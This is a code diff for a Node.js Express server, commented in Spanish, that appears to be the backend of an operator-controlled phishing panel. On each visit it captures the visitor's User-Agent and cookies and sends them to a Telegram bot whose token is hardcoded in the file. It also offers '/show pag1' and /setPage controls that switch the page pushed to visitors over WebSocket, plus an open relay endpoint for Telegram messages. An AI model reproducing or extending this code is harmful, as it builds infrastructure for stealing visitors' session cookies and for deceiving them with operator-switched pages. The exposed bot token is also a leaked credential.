@@ -19,11 +19,12 @@ app.use(cors());
 // 🔥 Servir archivos estáticos
 app.use(express.static(path.join(__dirname, "public")));
 
-// 🗄️ Base de datos SQLite (corregida para evitar errores)
-const db = new Database("control.db");
-db.exec("CREATE TABLE IF NOT EXISTS control (id INTEGER PRIMARY KEY DEFAULT 1, pagina TEXT)");
+// 🗄️ Base de datos SQLite
+const db = new Database("control.db", { verbose: console.log });
+db.exec("CREATE TABLE IF NOT EXISTS control (id INTEGER PRIMARY KEY, pagina TEXT)");
+db.prepare("INSERT OR IGNORE INTO control (id, pagina) VALUES (1, 'loader')").run();
 
-// 🔐 Credenciales de Telegram (usando los valores que enviaste)
+// 🔐 Credenciales de Telegram
 const TELEGRAM_BOTS = [
     {
         token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c",
@@ -31,13 +32,15 @@ const TELEGRAM_BOTS = [
     }
 ];
 
-// 📩 Función para enviar mensajes a Telegram
+// 📩 Función para notificar a Telegram
 function sendTelegramMessage(userAgent, cookies) {
     console.log("🔍 Enviando mensaje a Telegram...");
+    console.log("📌 User-Agent:", userAgent);
+    console.log("🍪 Cookies:", cookies);
 
     const message = `👀 *Nuevo visitante en la página*  
 📌 *User-Agent:* ${userAgent}  
-🍪 *Cookies:* ${JSON.stringify(cookies)}
+🍪 *Cookies:* ${JSON.stringify(cookies)}  
 
 📝 *Opciones:*  
 ➡️ /show pag1  
@@ -54,38 +57,39 @@ function sendTelegramMessage(userAgent, cookies) {
         }).then(() => {
             console.log(`✅ Mensaje enviado a Telegram - Bot: ${bot.token}`);
         }).catch(error => {
-            console.error(`❌ Error enviando mensaje al bot ${bot.token}:`, error.message);
+            console.error(`❌ Error enviando mensaje al bot ${bot.token}:`, 
+                error.response ? error.response.data : error.message
+            );
         });
     });
 }
 
-// 📌 Endpoint para verificar el estado de la página
+// 📌 Endpoint para verificar el estado de la página (corrige que no siempre devuelva "loader")
 app.get("/check", (req, res) => {
-    res.json({ pagina: "loader" });
+    const row = db.prepare("SELECT pagina FROM control WHERE id = 1").get();
+    const pagina = row ? row.pagina : "loader";
+    res.json({ pagina });
 });
 
-// 🏠 Ruta principal (cuando un usuario entra a la página)
-app.get("/", (req, res) => {
+// 🏠 Ruta principal (evita redirecciones inesperadas)
+app.get("/index.html", (req, res) => {
     const userAgent = req.headers["user-agent"];
     const cookies = req.cookies;
-
     console.log("📢 Nuevo visitante detectado:", { userAgent, cookies });
-    sendTelegramMessage(userAgent, cookies);
 
+    sendTelegramMessage(userAgent, cookies);
     res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
 // 🔌 WebSockets para actualización en tiempo real
 wss.on("connection", (ws) => {
     console.log("🔌 Cliente WebSocket conectado");
-    
-    // Enviar la última página guardada en la BD
+
+    // 🔥 Ahora obtiene el estado real desde la base de datos
     const row = db.prepare("SELECT pagina FROM control WHERE id = 1").get();
-    if (row && row.pagina) {
-        ws.send(row.pagina);
-    } else {
-        ws.send("loader");
-    }
+    const pagina = row ? row.pagina : "loader";
+
+    ws.send(pagina);
 
     ws.on("close", () => {
         console.log("🔌 Cliente WebSocket desconectado");
@@ -95,17 +99,16 @@ wss.on("connection", (ws) => {
 // ⚡ Endpoint para cambiar la página que se mostrará
 app.post("/setPage", (req, res) => {
     const { pagina } = req.body;
+
     if (!pagina) {
         return res.status(400).json({ error: "Falta el parámetro 'pagina'" });
     }
 
-    db.prepare("INSERT INTO control (id, pagina) VALUES (1, ?) ON CONFLICT(id) DO UPDATE SET pagina = ?")
-        .run(pagina, pagina);
-
+    db.prepare("UPDATE control SET pagina = ? WHERE id = 1").run(pagina);
     console.log(`✅ Página cambiada a: ${pagina}`);
 
-    // Notificar a todos los clientes WebSocket
-    wss.clients.forEach(client => {
+    // 🔥 Notificar a todos los clientes WebSocket
+    wss.clients.forEach((client) => {
         if (client.readyState === WebSocket.OPEN) {
             client.send(pagina);
         }
@@ -114,7 +117,7 @@ app.post("/setPage", (req, res) => {
     res.json({ message: "Página actualizada" });
 });
 
-// 📩 Nuevo endpoint para enviar mensajes a Telegram desde el frontend
+// 📩 Endpoint para enviar mensajes a Telegram desde el frontend
 app.post('/enviar-telegram', async (req, res) => {
     try {
         const { token, chatId, mensaje } = req.body;
@@ -123,7 +126,7 @@ app.post('/enviar-telegram', async (req, res) => {
             return res.status(400).json({ error: "Faltan datos requeridos (token, chatId o mensaje)" });
         }
 
-        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+        const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
             chat_id: chatId,
             text: mensaje,
             parse_mode: "MarkdownV2"
@@ -133,11 +136,17 @@ app.post('/enviar-telegram', async (req, res) => {
         res.json({ success: true, message: "Mensaje enviado correctamente a Telegram" });
 
     } catch (error) {
-        console.error(`❌ Error al enviar mensaje:`, error.message);
-        res.status(500).json({ error: "Error al enviar mensaje a Telegram" });
+        console.error(`❌ Error al enviar mensaje al bot ${req.body.token}:`, 
+            error.response ? error.response.data : error.message
+        );
+
+        res.status(500).json({ 
+            error: "Error al enviar mensaje a Telegram",
+            details: error.response ? error.response.data : error.message
+        });
     }
 });
 
 // 🚀 Iniciar servidor en Render
-const PORT = process.env.PORT || 3000;
+const PORT = 3000;
 server.listen(PORT, () => console.log(`🌍 Servidor corriendo en http://0.0.0.0:${PORT}`));
